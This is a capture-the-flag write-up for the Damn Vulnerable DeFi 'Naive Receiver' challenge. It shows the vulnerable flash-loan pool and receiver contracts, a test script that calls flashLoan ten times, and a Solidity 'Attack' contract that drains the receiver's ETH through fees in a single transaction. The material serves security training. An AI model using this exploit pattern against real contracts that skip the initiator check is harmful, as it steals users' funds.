# 02_NaiveReceiver

## Challenge

There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

You are provided with the code for the flashloan providing pool:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./FlashLoanReceiver.sol";

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error UnsupportedCurrency();
    error CallbackFailed();

    function maxFlashLoan(address token) external view returns (uint256) {
        if (token == ETH) {
            return address(this).balance;
        }
        return 0;
    }

    function flashFee(address token, uint256) external pure returns (uint256) {
        if (token != ETH)
            revert UnsupportedCurrency();
        return FIXED_FEE;
    }

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 balanceBefore = address(this).balance;

        // Transfer ETH and handle control to receiver
        SafeTransferLib.safeTransferETH(address(receiver), amount);
        if(receiver.onFlashLoan(
            msg.sender,
            ETH,
            amount,
            FIXED_FEE,
            data
        ) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        if (address(this).balance < balanceBefore + FIXED_FEE)
            revert RepayFailed();

        return true;
    }

    // Allow deposits of ETH
    receive() external payable {}
}
```

you also get the code for the Reveiver:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanReceiver is IERC3156FlashBorrower {

    address private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        assembly { // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
        
        if (token != ETH)
            revert UnsupportedCurrency();
        
        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal { }

    // Allow deposits of ETH
    receive() external payable {}
}
```

## Solution

If we take a look at the testcase, we see that to solve the challenge all money in the receiver shall be drained and all of it shall now be in the pool.

### Easy way

As the receiver just pays the fee for any call it gets from its pool we can just call the pool 10x and set the receiver to receive the flash loan and have to pay the 1 ETH fee. This can be just achieved by calling flashloan 10x:

```js
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const ETH = await pool.ETH();
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
        await pool.connect(player).flashLoan(receiver.address, ETH, await pool.maxFlashLoan(ETH), "0x");
    });
```

After this the receiver has transferred all his money to the pool and we solved the challenge

### Hard Way

The description state that we should also be able to do everything in one transaction. This is also achievable pretty easy. I just implemented a small attack contract, which if called, just calls the same flashloan function 10x. So we have one tx for everything. 

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract Attack {

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function getEmBoyz(address payable receiver, address payable pool) public
    {
        for (uint256 i = 0; i < 10; i++) {
            NaiveReceiverLenderPool(pool).flashLoan(FlashLoanReceiver(receiver), ETH, NaiveReceiverLenderPool(pool).maxFlashLoan(ETH), "0x");
        }
    }
}
```

We then just deploy this contract and call its function getEmBoyz().

```js
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    const Attack = await ethers.getContractFactory('Attack', player);
    attack = await Attack.deploy();
    await attack.connect(player).getEmBoyz(receiver.address, pool.address);
});
```

This yields us the same result, in one instead of ten txs.